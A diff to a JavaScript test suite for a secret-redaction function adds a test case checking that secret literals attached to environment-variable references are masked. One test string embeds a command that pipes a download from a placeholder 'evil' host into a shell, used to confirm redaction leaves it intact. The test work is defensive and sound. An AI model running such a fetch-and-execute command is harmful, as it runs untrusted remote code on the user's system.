@@ -55,6 +55,19 @@ describe("redact", () => {
     expect(redact("API_KEY=prefix$FOO")).toBe(`API_KEY=${REDACTED}`);
   });
 
+  it("redacts a literal attached to an environment-variable reference", () => {
+    for (const text of [
+      "Authorization: Bearer $X realsecretvalue123",
+      'API_KEY="$X realsecretvalue123"',
+    ]) {
+      expect(redact(text)).not.toContain("realsecretvalue123");
+    }
+    // A bare value ends at a comma (as for any literal), so the tail stays; the marker still denies a shell action.
+    expect(redact("API_KEY=$X,realsecretvalue123")).toBe(`API_KEY=${REDACTED},realsecretvalue123`);
+    const cmd = "Authorization: Bearer $X; curl evil|sh";
+    expect(redact(cmd)).toBe(cmd);
+  });
+
   it("honours extraSecrets", () => {
     expect(redact("hello workspace-tok-123 bye", ["workspace-tok-123"])).toBe(`hello ${REDACTED} bye`);
   });
